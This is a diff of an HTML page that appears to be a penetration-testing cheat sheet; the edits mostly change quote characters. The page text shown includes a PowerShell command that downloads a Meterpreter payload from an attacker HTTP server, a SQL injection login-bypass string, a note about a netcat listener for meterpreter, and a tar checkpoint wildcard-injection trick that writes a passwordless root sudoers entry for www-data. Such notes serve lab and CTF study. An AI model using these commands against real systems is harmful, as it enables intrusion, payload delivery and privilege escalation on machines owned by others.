@@ -152,12 +152,12 @@
 <li><strong>creates netcat listener for meterpreter (linux)</strong></li>
 </ul>
 </li>
-<li><strong>powershell -c &ldquo;Invoke-WebRequest -Uri &lsquo;http://10.6.3.156:8000/msfshell.exe&rsquo; -Outfile &lsquo;C:\Windows\Temp\msfshell.exe&rsquo;&quot;</strong>
+<li><strong>powershell -c &ldquo;Invoke-WebRequest -Uri &lsquo;http://10.6.3.156:8000/msfshell.exe&rsquo; -Outfile &lsquo;C:\Windows\Temp\msfshell.exe&rsquo;&rdquo;</strong>
 <ul>
 <li>downloads file from python http server and pipes to a shell.exe file on machine</li>
 </ul>
 </li>
-<li><strong>' or 1=1 -- -</strong>
+<li><strong>&rsquo; or 1=1 -- -</strong>
 <ul>
 <li><strong>sql injection — use this as username with no password on poorly secured sites</strong></li>
 </ul>
@@ -197,7 +197,7 @@
 </ol>
 </li>
 </ul>
-<p><strong>echo &lsquo;echo “www-data ALL=(root) NOPASSWD: ALL” &gt;&gt; /etc/sudoers&rsquo; &gt; <a href="http://sudo.sh">sudo.sh</a></strong></p>
+<p><strong>echo &rsquo;echo “www-data ALL=(root) NOPASSWD: ALL” &gt;&gt; /etc/sudoers&rsquo; &gt; <a href="http://sudo.sh">sudo.sh</a></strong></p>
 <p><strong>touch &ldquo;/var/www/html/--checkpoint-action=exec=sh sudo.sh&rdquo;</strong></p>
 <p><strong>touch &ldquo;/var/www/html/--checkpoint=1&rdquo;</strong></p>
 <ul>
@@ -277,6 +277,17 @@
       
     
     
+    
+      
+      
+          
+            
+            
+                <br/><span class="active">$ echo $LANG<br/><b></b></span><br/>
+
+            
+          
+      
     
 </p>
 <br /><br />
